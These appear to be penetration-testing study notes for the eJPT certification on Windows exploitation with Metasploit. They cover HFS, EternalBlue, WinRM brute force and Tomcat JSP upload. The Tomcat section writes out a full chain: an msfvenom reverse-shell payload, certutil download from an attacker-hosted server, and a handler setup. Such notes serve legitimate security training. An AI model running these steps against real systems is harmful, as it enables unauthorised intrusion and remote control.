# 33 Windows Exploitation

# Exploiting a Vulnerable HTTP File Server

- An HTTP File Server (HFS) is a web server that is designed for file & document sharing
- HTTP File Servers typically run on TCP port 80 and utilize the HTTP protocol for underlying communication
- Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux
- Rejetto HFS V2.3 is vulnerable to a remote command execution attack
- MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS

### DEMO

```shell
msf6: exploit(windows/http/rejetto_hfs_exec)
```


# Exploiting Windows MS17-010 SMB Vulnerability

- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of
- The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadows Brokers in 2017
- The EternalBlue exploit take advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands

- The EternalBlue exploit was used in the WannaCry ransomware attack on June 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible 
- This vulnerability affects multiple versions of Windows
	- Windows Vista
	- Windows 7
	- Windows Server 2008
	- Windows 8.1
	- Windows Server 2012
	- Windows 10
	- Windows Server 2016

- Microsoft released a patch for the vulnerability in March 2017, however, many users and companies have still not yet patched their systems
- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems
- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system

### DEMO

```shell
msf6: auxiliary(scanner/smb/smb_ms17_010)
msf6: exploit(windows/smb/ms17_010_eternalblue)
```


# Exploiting WinRM (Windows Remote Management Protocol)

- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems
- WinRM is typically used in the following ways
	- Remotely access and interact with Windows hosts on a local network
	- Remotely access and execute commands on Windows systems on the internet
	- Manage and configure Windows systems remotely
- WinRM typically uses TCP port 5985 and 5986 (HTTPS)

- WinRM implements access control and security for communication between systems through various forms of authentication
- We can utilize the MSF to identify WinRM users and their password as well as execute commands on the target system
- We can also utilize a MSF WinRM exploit module to obtain a meterpreter session on the target system

### DEMO

```shell
msf6: auxiliary/scanner/winrm/winrm_auth_methods # Verify auth methods
msf6: auxiliary(scanner/winrm/winrm_login) # Brute force
msf6: auxiliary(scanner/winrm/winrm_cmd) # Runs arbitrary Windows commands
msf6: exploit(windows/winrm/winrm_script_exec) # Uses valid credentials to login to the WinRM service adn execute a payload
```


# Exploiting a Vulnerable Apache Tomcat Web Server

- Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server
- It is used to build and host dynamic websites and web applications based on the java software platform
- Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
- Apache Tomcat runs on TCP port 8080 by default
- The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP
- The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java
- Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server
- We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server

### DEMO 

```shell
msf6: exploit(multi/http/tomcat_jsp_upload_bypass)
msf6: set payload java/jsp_shell_bind_tcp
msf6: set shell cmd # Use Windows shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > <name>.exe
sudo python -m SimpleHTTPServer 80 # Host the payload to download on sessions 1
msf6: sessions 1
msf6: certutil -urlcache -f http://<ip>/<name>.exe <name>.exe # Download the payload
nano handler.rc # Create handler 
	use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.49.3
	set lport 1234 
msfconsole -r handler.rc # Setup handler automatically 
msf6: ./<name>.exe # Run the payload, do on session 1 
```

#eJPT #cybersecurity 